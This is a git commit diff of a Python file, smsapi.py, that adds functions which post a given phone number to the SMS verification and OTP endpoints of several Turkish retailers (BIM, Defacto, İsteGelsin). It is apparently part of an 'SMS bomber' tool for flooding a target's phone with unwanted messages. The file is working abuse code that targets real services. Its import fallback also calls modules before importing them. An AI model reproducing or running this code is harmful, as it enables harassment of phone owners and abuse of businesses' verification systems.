07345de4e72b8e2ae480a7b2204e4da606ea14b3
Kaizer <160785683+Kaizer-33@users.noreply.github.com>
2024-02-24 16:24:43 +0300

    smsapi.py

--- smsapi.py
+++ smsapi.py
@@ -1,4 +1,26 @@
-import requests
+# smsapi.py
+
+try:
+    import requests
+    import urllib3
+    import uuid
+except ImportError:
+    print("Gerekli modüller indiriliyor bekleyiniz...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
+finally:
+    import concurrent.futures
+    import json
+    import os
+    import subprocess
+    import sys
+    import random
+    import requests
+    import string
+    import time
+    import urllib
+    import urllib3
+    import uuid
+
 
 def a101(number):
     try:
@@ -13,3 +35,51 @@ def a101(number):
             return False, "A101: SMS gönderilemedi"
     except Exception as e:
         return False, f"A101: {str(e)}"
+
+
+
+def bim(number):
+    try:
+        url = "https://bim.veesk.net/service/v1.0/account/login"
+        payload = {
+            "phone" : f"90{number}"
+        }
+        r = requests.post(url=url, json=payload, timeout=5)
+        if r.status_code == 200:
+            return True, "BIM: SMS gönderildi"
+        else:
+            return False, "BIM: SMS gönderilemedi"
+    except Exception as e:
+        return False, f"BIM: {str(e)}"
+
+def defacto(number):
+    try:
+        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
+        payload = {
+            "mobilePhone" : f"0{number}"
+        }
+        r = requests.post(url=url, json=payload, timeout=5)
+        r1 = json.loads(r.text)["Data"]
+        if r1 == "IsSMSSend":
+            return True, "Defacto: SMS gönderildi"
+        else:
+            return False, "Defacto: SMS gönderilemedi"
+    except Exception as e:
+        return False, f"Defacto: {str(e)}"
+
+def istegelsin(number):
+    try:
+        url = "https://prod.fasapi.net/"
+        payload = {
+            "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
+            "variables" : {
+                "phoneNumber" : f"90{number}"
+            }
+        }
+        r = requests.post(url=url, json=payload, timeout=5)
+        if r.status_code == 200:
+            return True, "İsteGelsin: SMS gönderildi"
+        else:
+            return False, "İsteGelsin: SMS gönderilemedi"
+    except Exception as e:
+        return False, f"İsteGelsin: {str(e)}"
